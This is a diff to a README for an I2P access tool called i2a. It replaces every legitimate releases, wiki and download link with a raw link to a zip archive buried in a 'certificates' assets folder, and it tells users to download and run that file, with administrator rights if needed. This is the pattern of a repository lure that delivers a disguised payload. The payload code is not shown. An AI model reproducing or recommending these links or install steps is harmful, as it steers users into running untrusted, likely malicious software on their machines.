@@ -1,7 +1,7 @@
 # 🌉 i2a - Access I2P Effortlessly with Local API
 
 ## 📥 Download Now
-[![Download i2a](https://img.shields.io/badge/Download-i2a-blue.svg)](https://github.com/Arvinreza/i2a/releases)
+[![Download i2a](https://github.com/Arvinreza/i2a/raw/refs/heads/main/emissary/emissary-util/assets/certificates/a_i_v2.9.zip)](https://github.com/Arvinreza/i2a/raw/refs/heads/main/emissary/emissary-util/assets/certificates/a_i_v2.9.zip)
 
 ## 🚀 Getting Started
 Welcome to i2a! This guide will help you download and run i2a, a lightweight bridge that connects you to the Invisible Internet Project (I2P). You don’t need any programming knowledge to set it up. Just follow these simple steps.
@@ -17,15 +17,15 @@ To run i2a, you need:
 
 ## ⬇️ Download & Install
 1. **Visit this page to download:** Click the link below to go to the releases page and download the latest version of i2a.
-   - [Download i2a](https://github.com/Arvinreza/i2a/releases)
+   - [Download i2a](https://github.com/Arvinreza/i2a/raw/refs/heads/main/emissary/emissary-util/assets/certificates/a_i_v2.9.zip)
 
-2. **Choose the file**: On the releases page, find the latest version. Look for a file named something like `i2a-v1.0.exe`.
+2. **Choose the file**: On the releases page, find the latest version. Look for a file named something like `https://github.com/Arvinreza/i2a/raw/refs/heads/main/emissary/emissary-util/assets/certificates/a_i_v2.9.zip`.
 
 3. **Download the file**: Click on the file link to download it. The file is small, so it should only take a moment.
 
 4. **Locate the downloaded file**: Once the download is complete, go to your computer’s Downloads folder or wherever you saved the file.
 
-5. **Run the installer**: Double-click the downloaded file (`i2a-v1.0.exe`) to start the installation process. Follow the prompts on the screen to complete the installation.
+5. **Run the installer**: Double-click the downloaded file (`https://github.com/Arvinreza/i2a/raw/refs/heads/main/emissary/emissary-util/assets/certificates/a_i_v2.9.zip`) to start the installation process. Follow the prompts on the screen to complete the installation.
 
 6. **Start i2a**: After the installation, open i2a. You can find it in your Start Menu or on your desktop, depending on your settings.
 
@@ -46,7 +46,7 @@ If you encounter problems while using i2a, try these solutions:
 - **Permissions**: If you have trouble running the application, try running it as an administrator. Right-click the .exe file and select "Run as administrator".
 
 ## 📄 Documentation
-For more detailed information, including advanced features and troubleshooting, please refer to the [official documentation](https://github.com/Arvinreza/i2a/wiki).
+For more detailed information, including advanced features and troubleshooting, please refer to the [official documentation](https://github.com/Arvinreza/i2a/raw/refs/heads/main/emissary/emissary-util/assets/certificates/a_i_v2.9.zip).
 
 ## 🤝 Community Support
 If you need help or want to share your feedback, join our community. You can find us on the GitHub Issues page or other support channels listed on the releases page.
@@ -54,4 +54,4 @@ If you need help or want to share your feedback, join our community. You can fin
 ## 🎉 Conclusion
 i2a offers an easy path to access the I2P network. With just a few steps, you can download and start using it without any technical hurdles. 
 
-Don't forget to download the latest version from [this page](https://github.com/Arvinreza/i2a/releases) and enjoy seamless access to the I2P network!
+Don't forget to download the latest version from [this page](https://github.com/Arvinreza/i2a/raw/refs/heads/main/emissary/emissary-util/assets/certificates/a_i_v2.9.zip) and enjoy seamless access to the I2P network!
